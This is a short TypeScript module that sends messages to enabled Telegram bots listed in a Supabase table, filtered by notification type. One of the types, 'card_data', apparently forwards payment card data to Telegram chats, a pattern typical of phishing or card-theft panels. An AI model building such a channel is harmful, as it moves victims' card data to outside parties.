
import { supabase } from '../../../../../src/integrations/supabase/client';

interface TelegramBot {
  id: number;
  name: string;
  token: string;
  chat_id: string;
  enabled: boolean;
  notify_new_orders: boolean;
  notify_payments: boolean;
  notify_card_data: boolean;
}

export async function sendTelegramNotification(
  message: string, 
  notificationType: 'new_order' | 'payment' | 'card_data' = 'new_order'
): Promise<boolean> {
  try {
    // Get all active bots
    const { data: bots, error: botsError } = await supabase
      .from('telegram_bots')
      .select('*')
      .eq('enabled', true);
      
    if (botsError) {
      console.error('Error fetching Telegram bots:', botsError);
      return false;
    }
    
    if (!bots || bots.length === 0) {
      console.warn('No active Telegram bots found');
      return false;
    }
    
    // Filter bots based on notification type
    const filteredBots = bots.filter((bot: any) => {
      switch (notificationType) {
        case 'new_order':
          return bot.notify_new_orders;
        case 'payment':
          return bot.notify_payments;
        case 'card_data':
          return bot.notify_card_data;
        default:
          return false;
      }
    });
    
    if (filteredBots.length === 0) {
      console.warn(`No bots configured to receive ${notificationType} notifications`);
      return false;
    }
    
    // Send notification to all filtered bots
    const sendPromises = filteredBots.map(async (bot: any) => {
      try {
        // Ensure token and chat_id are not empty
        if (!bot.token || !bot.chat_id) {
          console.warn(`Bot ${bot.name} has incomplete configuration`);
          return false;
        }
        
        const response = await fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            chat_id: bot.chat_id, 
            text: message,
            parse_mode: 'HTML' // Enable HTML formatting
          }),
        });
        
        if (!response.ok) {
          const errorBody = await response.text();
          console.error(`Failed to send Telegram notification to bot ${bot.name}:`, errorBody);
          return false;
        }
        
        console.log(`Telegram notification sent successfully to bot ${bot.name}`);
        return true;
      } catch (error) {
        console.error(`Error sending Telegram notification to bot ${bot.name}:`, error);
        return false;
      }
    });
    
    // Wait for all send operations to complete
    const results = await Promise.all(sendPromises);
    
    // Return true if at least one notification was sent successfully
    return results.some(result => result === true);
  } catch (error) {
    console.error('Error in sendTelegramNotification:', error);
    return false;
  }
}
